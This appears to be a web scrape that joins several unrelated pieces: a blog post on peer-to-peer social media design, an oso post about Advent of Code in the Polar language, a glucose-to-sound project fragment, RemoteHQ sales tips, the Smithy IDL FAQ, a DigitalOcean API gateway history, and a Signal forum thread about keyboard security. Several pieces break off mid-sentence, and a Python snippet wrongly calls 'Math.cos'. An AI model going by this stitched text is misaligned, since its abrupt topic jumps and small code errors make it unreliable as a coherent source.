<p>In my last post I argued that <em>what comes next</em> should be an <a href="https://generativist.falsifiable.com/metaverse/what-should-social-look-like">emphemeral-by-default, peer-to-peer, algorithmically-augmented</a> social medium. A while before that, I started focusing on a different question: <strong>how can we build a medium that can synthesize twitter’s capabilities, albeit peer-to-peer</strong>.<label for="sn-0"></label><span>The data used in <a href="https://generativist.falsifiable.com/metaverse/dunbars-number-is-quadratic">Dunbar’s Number Is Quadratic</a> was originally collected for that purpose. It was merely a convenient sample that I already had for that post.</span> I can’t answer this question in a single post. More than that, I don’t think I can answer it alone. But, I think it’s useful to start by thinking about messages and their propagation.</p>

<p>Carving away extraneous detail, tweets are the atoms of the twitter universe. They bind a blob of content to an identity at a particular time. Likes and retweets are time and identity bound pointers to tweets. They socially allocate attention without content creation. Quote tweets, replies, and quoted replies are compounds. They bind a blob of content <em>and</em> a pointer (or two) to an identity at a particular time. Ignoring time and identity, these foundational interactions look like,</p>
<figure><img src="https://p.falsifiable.page/zQmdC81odYejoG8GBKzaf44AxxbzBGiohrX8hiT6AUWuDcV" alt=""></figure><p>But, that is not the whole story. They joy of the medium is how users weave these interactions into a tapestry. Thus, if you want to synthesize twitter with P2P distribution, you can’t only consider atomic message exchange. You need to think about sub-graph collation and propagation, too. Measured in bytes, these may not be large objects. But, measured in milliseconds, latency can add up quickly – and <strong>latency matters a lot</strong>.</p>
<h2 id="sharing-subgraphs">Sharing Subgraphs</h2><p>Assume each foundational interaction (message) has a unique content hash.<label for="sn-1"></label><span>Assuming cryptographic hash functions and messages with timestamps and (optional?) nonces, this is an easy assumption to satisfy. Since the pointers are also covered by the hash function, there is also a block chain/graph structure for some messages. But I don’t think this should work via consensus (baring deliberate commits to a global ledger). My mental image is more like a soup of memes as unbound proteins.</span> The P2P network allows you to query for hashes and the associated content. The actual content includes a reference to the users identity as well as a cryptographic signature of the message.<label for="sn-2"></label><span>The signature signs the hash, so it’s not technically part of the message that gets digested. It’s just stored and shared as a sibling of the content.</span> Each node maintains a small subset of this data, conditional upon user and algorithmic requirements.</p>
<p>You have both the content <span>\(c_0\)</span> and its associated hash <span>\(f(c_0)\)</span>. The content-associated identity allows you to connect to the author or their delegated proxy. Where squares refer to the identity (identitical in this case), you have the following thread,<label for="sn-3"></label><span>I’m using threads because they are the easiest to reason about, not because they are the only sub-graph shape.</span></p>
<figure><img src="https://p.falsifiable.page/zQmUhvHLzEddXnMv5mpVV6P5RpvEdwpwDeJPm4gVa1QP6hL" alt=""></figure><p>If the protocol supports an action like <code>retrieve_subgraph(c)</code> and you are connected to <span>\(u_0\)</span>, this is an <span>\(O(1)\)</span> operation.</p>

<p>Now consider the following thread,</p>
<figure><img src="https://p.falsifiable.page/zQmZyTHaMBUrp67x2J2RXbU2LZ91Jk1pLrj5cq7LH3Loqeu" alt=""></figure><p>What happens when you call <code>retrieve_subgraph(c)</code> for <span>\(c_0\)</span> on <span>\(u_0\)</span>?</p>

<p>In the ideal case, <span>\(u_0\)</span> returns the entire thread in <span>\(\mathcal{O}(1)\)</span>. Because messages are signed and contain pointers the relevant parents, authenticity of the result is cryptographically assured. However, if <span>\(u_0\)</span> is is unaware of some inbound references or it has evicted them from its persistent stores and ephemeral buffers, the resulting view is incomplete in <span>\(\mathcal{O}(1)\)</span>.</p>

<p><strong><em>This incompleteness is not a bad thing.</em></strong> Two cases illustrate why,</p>

<ul>
<li><p><em>Abuse</em>: If <span>\(c_1\)</span> is abusive content replying to <span>\(c_0\)</span>,  <span>\(u_0\)</span> is under no obligation to propagate it. <span>\(u_0\)</span> created the context; they are in the best situation to moderate it.</p></li>

<li><p><em>Indirect Criticism</em>: If <span>\(c_0\)</span> is in some way bad and <span>\(u_1\)</span> wants to comment on it without provoking <span>\(u_0\)</span> or their followers,<label for="sn-4"></label><span>Screenshot tweets on twitter smell like a missing feature. But, I think there should be something like a detatched-head flag because I would probably let my agent filter out most of these interactions. I’d disable screenshot tweets if I could.</span> <span>\(u_1\)</span> is under no obligation to notify <span>\(u_0\)</span>.</p></li>
</ul>

<p>In the case of abuse, subscribers of <span>\(u_0\)</span> and not <span>\(u_1\)</span> benefit from the failure to propagate. Alternatively, subscribers of both are in the best position to evaluate and mediate (or ignore) the possible conflict. In the case of indirect criticism, the often self-perpetuating collision between identities and cliques is less likely to occur.</p>
<h2 id="incompleteness-is-structure">Incompleteness is Structure</h2><p><strong>This local incompleteness does not imply inaccessibility</strong>. For example,  consider the simple case where <span>\(u_0\)</span> flushed its ephemeral buffers and chose not to retain the rest of the chain.</p>

<ul>
<li><p>If the requester exhaustively queried each user on the graph, the cost of achieving completion would be a burdensome <span>\(\mathcal{O}(n)\)</span>.<label for="sn-6"></label><span>More likely, they would rely on a content accelerator intermediary. However, I assume those nodes augment the ecosystem at an additional cost to either the person making the query or the content producer, preserving incentives.</span> Unconditional queries are decidedly not social.</p></li>

<li><p>If the requestor queried users in proportion to prior interaction frequencies – and if nodes retained messages in proportion to time and interaction frequencies – the upper-bound is still <span>\(n\)</span>. However, <em>the expected time until completion is much, much lower, as a property of the interaction graph</em>. Interaction proportional queries are inherently social.<label for="sn-7"></label><span>This argument works for propagation by gossip, too.</span></p></li>
</ul>

<p>Now, assume there is a maximum cost threshold for queries. This may be explicitly programmed or implicitly generated as a function of latency, which users robustly do not tolerate.<label for="sn-8"></label><span>The argument still works for gossip distribution assuming user’s have finite resources and want to dedicate the minimum sufficient amount. This is a bit hand-wavy, but go on-board for <a href="https://scuttlebutt.nz/">SSB</a> and you’ll have a more visceral sense of how this is a useful constraint.</span> Assuming the heterogeneity of BYO algorithms and interfaces, this distribution does not lend itself to easy analysis. <em>That is a good thing!</em> The ragged landscape resists easy exploitation and manipulation. However, we can say something critical about the induced pressure – <strong>the probability of observing a message becomes a function of social peers willingness to propagate it.</strong></p>

<p>Whether by algorithm or explicit action, this structure allows users to engage in both amplification and <em>attenuation</em>.  These probabilistic boundaries can be rendered sharper given the addition of inhibiting signals – mutes and blocks operating at the level of either identity <em>or content</em>, functioning as something like antigens.<label for="sn-5"></label><span>I’m extremely biased here. After I finished my Ph.D. on belief systems and how they socially break down, I started working on a computational immune system for twitter via the API. Ignoring my conclusion – <a href="https://generativist.falsifiable.com/metaverse/where-did-the-future-go">that I was building a sand castle on someone’s private beach</a> – the API restricts made it extremely coarse. A lot of my motivation now is in making sure it’s possible on what comes next.</span> The willingness to accept or ignore one of these attestations of harm is at the discretion of the user. Boundary spanners may ignore them or implement time decay, facilitating social graph healing. Those more vulnerable may enforce them rigorously, warding off harms. But, in both cases, <a href="https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful">these boundaries are subject to continuous (re-)negotiation, rather than punctuated and durable ruptures</a>.</p>
<p>The result is socially-shaped content propagation.<label for="sn-9"></label><span>You can go even further and have nodes that propagate some messages to only some people. It’s a common social behavior. I think <a href="https://en.wikipedia.org/wiki/Google%2B#Circles">Circles</a> didn’t work because it was too rigid and effortful. But probablistic and conditional delivery is a huge opportunity.</span>  The decision not to propagate <em>is</em> a form of censorship. But, <strong>it exists at something like the maximum margin between freedom of speech and freedom of reach.</strong> Your time and attention are finite. The social graph structures it in useful ways. You need not abdicate your responsibilities and deliberation; but, you can collaborate for the purpose of socially-allocated attention.</p>
<h2 id="next-steps">Next Steps</h2><p>The great power of social media is discovery. Social discovery depends on,</p>

<ol>
<li>The willingness of inter-mediating paths to propagate a message;</li>
<li>The existence of ancillary curation services;</li>
<li><strong>The ability of peers to connect to each other or by proxy quickly</strong></li>
</ol>

<p>I’m confident that (1) is not only viable, but the fundamental solution. I also believe (2) is a useful out-of-core service, that helps with heterogeneity and ensures the platform can evolve. The big issue is (3). Last year, I started building a platform to fill exactly this gap, but I set it aside. Now, it’s time to pick it back up. <strong>If you have expertise in building cryptographic distributed systems, I do want to hear from you.</strong> In the meantime, I’m going continue doing ground work including building …</p></section></article></div>

<h3>What is Polar</h3>
<p>The oso policy language, Polar, is designed to be good for writing authorization policies. Many of the choices made optimize for that use case. Things like its logic-based nature, pattern-matching specializers and how easy it is to interoperate with the host language's objects are all meant to make it easy to write policies over your existing data to make authorization decisions. But Polar isn't just for authorization, it's actually a fully general purpose language, a close relative of Prolog, and should be powerful enough for any computing task.</p>
<p>It's a good exercise to try and write programs in Polar that are more complicated than your average authorization rule set. Previously we even <a href="https://www.osohq.com/post/polar-adventure">implemented an entire game in Polar</a>. Using Polar in new and different ways teaches us a lot about the language and its rough edges.</p>
<h3>Why advent of code</h3>
<p><a href="https://adventofcode.com/">Advent of code</a> is a fun series of programming puzzles that are published every day from December 1st to December 25th. I've been a big fan of advent of code for a while and it has been a tool I've used to get better at programming. It's especially useful to me to try out a new language I'm learning. I did advent of code in Rust a few years ago when I was just getting started, and it really helped accelerate how fast I got the hang of things having to solve a bunch of different kinds of problems. I thought that this year I could do the same thing for Polar, and use advent of code to really see what it could do.</p>
<p>I have to admit I haven't finished all the problems yet but I've learned a ton about Polar, both good and bad in the process. I've clarified to myself a bunch of patterns that show up when writing Polar programs, found some rough edges in the language that we can clean up, and come up with some features that could help Polar in the future.</p>
<h2>Common Programming Patterns With Polar</h2>
<h3>Loops and Recursion</h3>
<p>Many times when solving a problem you need to iterate over a data structure. In the cases where this came up in advent of code it was usually a list. Polar has three ways to deal with lists: <code>in</code>, <code>forall</code>, and recursion.</p>
<p><code>in</code> is an operator that binds a variable to every member of a list. It can be used for membership checks, and can be combined with another expression to make a filter: <code>x in [1,2,3] and x &gt;= 2</code>.</p>
<p><code>forall</code> is an operator that succeeds if everything within it succeeds. <code>forall</code> is usually combined with <code>in</code> to check if a condition is true for every element in a list: <code>forall(x in [1,2,3], x &lt; 10)</code>.</p>
<p>If however you need to process a list element by element and combine the values in some way, you need to use list destructuring and recursion. We can do that with rules that match on a list with a rest variable. The <code>[first, *rest]</code> specializer matches a list and binds the first element to <code>first</code> and the rest of the list to <code>rest</code>.</p>
<p>Lets say you have a list of numbers and you want to sum them. There are two ways you can write this in Polar. This first way recursively goes down the list until it hits the base case (the empty list <code>[]</code>) and then builds back up the answer. </p>
<pre><code>sum([], 0);
sum([first, *rest], ans) if
    sum(rest, rest_ans) and
    ans = rest_ans + first;
</code></pre>

<p>The other way to write it is like this:</p>
<pre><code>sum([], ans, ans);
sum([first, *rest], prev_ans, ans) if
    this_ans = first + prev_ans and
    sum(rest, this_ans, ans);
sum(lst, ans) if sum(lst, 0, ans);
</code></pre>

<p>The differences here are subtle but important. In the first example you recurse down to the base case and then build up the result. In the second example you pass the intermediate result down to the next level and then bind the result var once you hit the base case.</p>
<p>The first one seems like it's a little simpler (it's less lines of code after all) but the second one should actually be preferred. It's an iterative recursive algorithm and can be thought of as a loop. The recursive call is the last thing in the rule which makes this a tail call and we can optimize this kind of recursion so that the stack doesn't grow. We are planning to implement this kind of optimization and have an <a href="https://github.com/osohq/oso/issues/641">issue</a> that you can vote on if it's import to your use cases.</p>
<p>Blowing the stack was something that happened a lot in my work on these problems. Tail call optimizations are something we need to add and when we do the second example will work even on very large arrays.</p>
<p>Another thing this pattern shows is how you can set up a recursive rule with two definitions: one that's the base case, and one that's the recursive case. Being able to lay these out with specializers I think makes it easy to see what's happening. When you have to add intermediate values to your recursive rules you can simply wrap the whole thing in a helper that sets up the default values and calls it directly for a list.</p>
<h3>Function Calls</h3>
<p>Polar rules don't work the same as functions in other languages. There is no return value; they simply specify relationships between variables and the rule succeeds or it doesn't. Sometimes (lots of times) you want to calculate something with a rule and get an answer out. In these cases you can use a function call pattern.</p>
<pre><code>add(a, b, answer) if answer = a + b;
</code></pre>

<p>You can simply pass another variable to a rule that will get bound to the result. This is something you get very comfortable with after writing Polar for a while, but can be confusing the first time you see logic programming.</p>
<h3>Helper functions</h3>
<p>Polar doesn't have a lot of builtin functions for operating on values. Lots of the power of Polar is that you can easily use host language objects and methods. For some problems if I needed something like a math function that wasn't defined in Polar I could easily set up a helper class with that method from Python and use it in Polar.</p>
<pre><code>class Lib:
    @staticmethod
    def cos(f):
        return Math.cos(f);

oso.register_constant(Lib, "Lib")
</code></pre>

<pre><code>cos(f, ans) if ans = Lib.cos(f);
</code></pre>

<h3>Inline Queries</h3>
<p>Polar has syntax for specifying an inline query, which is run when a Polar file is loaded and will throw an error if it doesn't succeed. I used these extensively for unit tests when doing advent of code problems.</p>
<pre><code>add(a, b, ans) if ans = a + b;

?=add(1,2,3);
?=not add(1,2,4);
</code></pre>

<h3>If / Else</h3>
<p>A Polar rule either succeeds, or it fails. If it fails, it backtracks and doesn't evaluate any more terms in the current branch. But sometimes you want to check if some condition is true, and do one thing if it is and another if it isn't. In most languages this would be an <code>if</code> / <code>else</code> branch. In polar you can do an equivalent thing with <code>or</code> and <code>cut</code>. The <code>or</code> sets up a choice point and the <code>cut</code> eliminates the untaken branch.</p>
<pre><code>(
    check_something() and
        then_block() and cut
) or (else_block());
</code></pre>

<h3>Case / Match statements</h3>
<p>Sometimes you have a value and you want to do different things depending on what the value is. In other languages this could be a switch statement, a match statement or even a big chain of <code>if</code> / <code>else if</code>/ <code>else</code> blocks. In Polar the best way to do these are with individual rules and specializers. This came up a lot in advent of code (as you'll see soon) and results in some really nice looking code.</p>
<h2>Places where Polar was a great fit</h2>
<p>Day 4 was one of my favorites to write in Polar. It's a great fit for the language. I had a list of inputs and a list of rules the inputs had to satisfy to be valid. This is very similar to a policy so I could write out the rules in Polar and evaluate them.</p>
<p><a href="https://gist.github.com/saolsen/114e4a8fca950cf143ff1924f13629a3">https://gist.github.com/saolsen/114e4a8fca950cf143ff1924f13629a3</a></p>
<p>Day 8 was my favorite of them all. I had to implement a little virtual machine. This included many of the patterns I spoke about above: using helpers from Python (in this case list indexing), the <code>if</code>/  <code>else</code> block pattern, and having rules for the individual operations:</p>
<pre><code>op("acc", arg, acc, i, next_acc, next_i) if next_i = i+1 and next_acc = acc+arg;
op("jmp", arg, acc, i, acc, next_i) if next_i = i+arg;
op("nop", _, acc, i, acc, next_i) if next_i = i+1;
</code></pre>

<p>The best part of day 8 was on part two where I had to take the program (the input) and find a version where a single instruction was swapped to a different one that made the program terminate. Without the swap the program will enter into an infinite loop. In Polar I can simply evaluate the program as usual but when I hit one of the swappable instructions, evaluate it swapped and not swapped. If I detect that that the program is looping, the query fails (and backtracks) and this way I can search the whole state of possible programs.</p>
<p><a href="https://gist.github.com/saolsen/df640e94933ead78da501da175249194">https://gist.github.com/saolsen/df640e94933ead78da501da175249194</a></p>
<h2>Places where Polar was a bad fit</h2>
<p>There were also some rough edges I hit.</p>
<h3>Counting successes</h3>
<p>A Polar rule either succeeds or fails. In a lot of cases I wanted to count the number of successes of a rule. For instance in a list of items, how many of them pass a rule? We have <code>forall</code> to see if all of them succeed, but no way to see how many succeed right now. You have to recurse over the list yourself and count as you go. There are some Prolog predicates that exist for this kind of thing ( <code>bagof</code> / <code>setof</code> / <code>findall</code> ) that we might consider adding to Polar.</p>
<h3>List operations</h3>
<p>There are many things you might want to do with lists that aren't built in. The only real built-in tool that you have is destructuring, which lets you pull items off the head and place items onto the head of lists. These operations are based on Lisp-style <code>cons</code> cells, where those are the only efficient operations. All other operations, like appending lists together, getting the nth element, or counting the length, etc have to be done with recursive rules, which adds to the complexity of the algorithm.  Polar represents lists internally as Rust vectors, not cons cells, so we could add builtins for other operations like getting the length, or appending to the end, or pulling out slices. There were many different days where any or all of these would have been useful, but I had to implement them as helpers in Python.</p>
<h3>Large searches</h3>
<p>Our defaults for stack size limit and timeouts for running a query are set small because …</p></div></div></div>

data points actually “sound” like. This is my attempt to find out. :)</p><p>The first step was actually getting my blood glucose data. I did this using an opensource project called
<a href="http://www.nightscout.info/" target="_blank" rel="noopener">nightscout</a>.
Nightscout scrapes my continuous glucose monitor that I wear on my body, and gives me an easy-to-use API for my data.
Once I have a day’s worth of glucose data, the challenge becomes how do I turn that into sound.
Initially I directly wrote glucose values to a wav file, but it sounded like complete junk. I eventually learned I needed
some sort of sinusoidal wave to hear anything like a tone that I was hoping for. I attempted to generate this sine wave
on my own and match it to the glucose value, but it just didn’t sound right. I also tried messing with the data to
upsample it but this turned out to be more tricky than I originally expected. Eventually though, I found a python library that could
generate tones, and used the glucose data as input for that.</p><p>You can see my whole adventure with this project in the gist I have attached below.
Also feel free to check out the code on my github here: <a href="https://github.com/dddiaz/glucose-sound">https://github.com/dddiaz/glucose-sound</a></p><p>Also, you are probably wondering how the sound actually came out like… well here you go :)</p><p><audio controls="">

There is little opportunity to have face to face demos or client meetings and teams have to adapt accordingly. Sales teams must learn how to create a personal experience for their potential clients virtually - having an interactive demo is vital. The virtual video call must parallel the warmth of an in person experience. Below are a few tips on how to have a more interactive sales demo. </p><p><strong>1. Use Shared Browser instead of screenshare.</strong></p><p>Screenshare is so 2020. <a href="https://remotehq.co/3i9xedO">Shared Browser</a> is a cloud-based browser that gives control to multiple participants. With RemoteHQ ‘s Shared Browser, you can co-browse any URL. This makes the experience more interactive as your clients can move around the page and easily explore any site/deck you’re sharing. However, this is only if/when you want guests to have control and edit access - you can change the permissions of Shared Browser at any time. You can easily have different teammates take control and lead the conversation rather than awkwardly turning screen share on and off between everyone. Shared Browser moves the meeting along faster than screen share, helping you perform better. Learn more about the <a href="https://remotehq.co/3oIVLsQ">power of Shared Browser</a> on our blog. </p><p><strong>2. Make time for questions throughout the demo</strong></p><p>It’s important to make sure your potential customers are able to ask questions and fully understand what you’re selling. With the reactions feature on RemoteHQ, all participants can easily raise their hands virtually. When someone’s hand is raised, there will be an ✋icon next to their video tile and once they start speaking, the icon will automatically go away. This way, there is no need to interrupt. Reactions make it clear when there is a question, so you can see who has questions and pause accordingly. </p><p><strong>3. Interactive notes</strong></p><p>Having accessible and visible notes during a meeting helps keep everyone focused and on task. Having an agenda on the screen helps guide the conversation and move it along at the right pace. It also lets everyone know what’s coming up in the conversation. The notes app on RemoteHQ is quick to pull up and also saves into your session history, which you can send to all guests after the meeting. Having a virtual whiteboard for group brainstorming is also a plus for an interactive demo. &nbsp;</p><p><strong>4. Insert video</strong></p><p>Video has been proven to retain a consumer’s attention better than text. It’s more engaging and entertaining for the viewer to consume. On RemoteHQ, you can open up the YouTube app integration and play a video on a call. Or simply go to YouTube, Vimeo, TikTok, etc on Shared Browser for a seamless transition. </p><p><strong>5. Focus on the demo</strong></p><p>Let RemoteHQ do the heavy lifting. Turn on audio transcription and let RemoteHQ take notes for you. &nbsp;This allows you to focus on what is most important: Pitching to your prospect. At the end of your session everything that was said by all participants will be available to you. Easily copy and paste them into your CRM for a record of what happened. Throughout the demo, you can also sync your layout with everyone in the meeting whenever you move from different pages and apps - this important to keep clients on track and paying attention to what you want them to do. </p><p><a href="https://remotehq.co/2LNIUXz">Try it out</a> and see if these tips can help you on your next sales call!

        <div>
            <h2>FAQs</h2>

            <h2>Why did you develop Smithy?</h2>
            <p>Smithy is based on an interface definition language that has been widely
                used within Amazon and AWS for over a decade. We decided to release Smithy
                publicly to let other developers use Smithy for their own services and
                benefit from our years of experience with building tens of thousands of
                services. By releasing the Smithy specification and tooling, we also hope
                to make it easier for developers to maintain open source AWS SDKs.</p>

            <h2>Does Smithy only work with AWS?</h2>
            <p>No. Smithy can be used with any kind of service. All AWS-specific metadata
                in Smithy is implemented as decoupled packages.</p>

            <h2>Why not just use an existing IDL?</h2>
            <p>At AWS, we rely heavily on metadata, code generation, service frameworks,
                client libraries, and automated policy enforcement. Existing IDLs
                available outside of AWS were not extensible enough to meet our needs
                and not compatible with our existing services.</p>

            <h2>How is Smithy different than other IDLs and frameworks?</h2>
            <p><strong>Smithy is built for code generation and tools.</strong>
                Smithy models were designed for the purpose of generating code for
                multiple programming languages. For example, Smithy models are
                completely normalized, which gives all generated types an explicit
                name and makes models easy to traverse, validate, and diff.</p>
            <p><strong>Smithy can be extended <em>and</em> constrained.</strong>
                Traits are used to extend a model and add capabilities that are not
                part of the core specification. For example, AWS defines AWS-specific
                traits that are used to generate other metadata documents that are
                derived from Smithy models. While extensibility is a key design
                requirement, Smithy provides a built-in validation system that
                ensures models adhere to a configurable set of rules and policies.</p>
            <p><strong>Smithy is protocol agnostic.</strong> Smithy decouples the
                transport layer of web services from the data structures and capabilities
                of the service so that they can evolve independently.</p>
            <p><strong>Smithy helps large organizations collaborate on APIs.</strong>
                Smithy allows different aspects of a model to be owned by different
                teams. We use this feature at AWS to allow the documentation teams
                to own API documentation, while service owners control the shape and
                operations of a service.</p>
            <p><strong>Smithy models can be altered for different audiences</strong>.
                Smithy's <em>projection</em> system allows the contents of a model to
                be filtered and changed based on who a particular build of a model is
                intended for. This allows for use cases like maintaining an internal
                and external version of a model and providing beta models to customers
                as part of a private beta.</p>

            <h2>What does protocol-agnostic mean?</h2>
            <p>Protocol-agnostic means that the model is an abstraction that specifies
                the rules and semantics of how a client and server communicate. The
                transport and serialization format of a service is left as an
                implementation detail, allowing them to evolve over time. For example,
                a service owner may wish to evolve their serialization format (e.g.,
                move from text to binary), their connection type (e.g., move from
                HTTP/1 to HTTP/2), or launch entirely new capabilities.</p>

            <h2>What is the main difference between Smithy and OpenAPI?</h2>
            <p>The primary difference between Smithy and OpenAPI is that Smithy is
                protocol-agnostic, allowing Smithy to describe a broader range of
                services, metadata, and capabilities. Smithy can be used alongside
                OpenAPI by <a href="https://awslabs.github.io/smithy/guides/converting-to-openapi.html">converting Smithy models to OpenAPI</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>

<p>Wait so just to be clear, the “signal vulnerability” is that Android’s Chinese keyboard sucks and people use a third party app?</p>
</blockquote>
<blockquote>
<p>While I understand the concern, I don’t see Signal being responsible for solving this threat vector.</p>
</blockquote>
<p>“Responsibility” is a bit illusory. I think it’s more useful to consider how easy it would be to add a feature that could really help people. If the impact outweighs the difficulty (and I think it probably does), then whether Signal is obligated to make the change seems like a red herring.</p>
<p>One philosopher could argue that the developers are responsible for nothing, since the app is free. Another could argue that they’re responsible for every possible “butterfly effect” of their decisions. That debate is a bit academic and I don’t think especially helpful for making decisions about feature requests.</p>
<blockquote>
<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
</blockquote>
<p>Loss of users’ trust if the app gives the impression of “spying” on their language is a fair concern. But I think it could be implemented in a way that “tracks” nothing and offers a warning that allays any user concerns. For example, there could be a heuristic of “50% or more Chinese characters”. The first time an outgoing message triggers that heuristic, Signal could display a one-time warning. For example" It looks like you’re writing in Chinese. If you are using a third-party Chinese keyboard, it may not be secure. Consider using the phone’s built-in keyboard."</p>

<p>Absolutely, and I wouldn’t recommend any form of policing. But a well-timed and well-placed warning of this <em>very</em> common threat wouldn’t be (and I don’t think would even be perceived as) policing. The warning could be phrased in a way that emphasizes the risks of using third-party IME <em>alongside</em> Signal and makes no general claims about whether the user should take advantage of those apps in other contexts.</p>

<p>That sounds like it has the potential to be a really slick heuristic. “You seem to be using X app… here’s why that might be a problem.” On the other hand, there might be a higher risk of false positives than with a “50%+ Chinese characters” heuristic. I’ll have to defer to folks who know more about app development.</p>

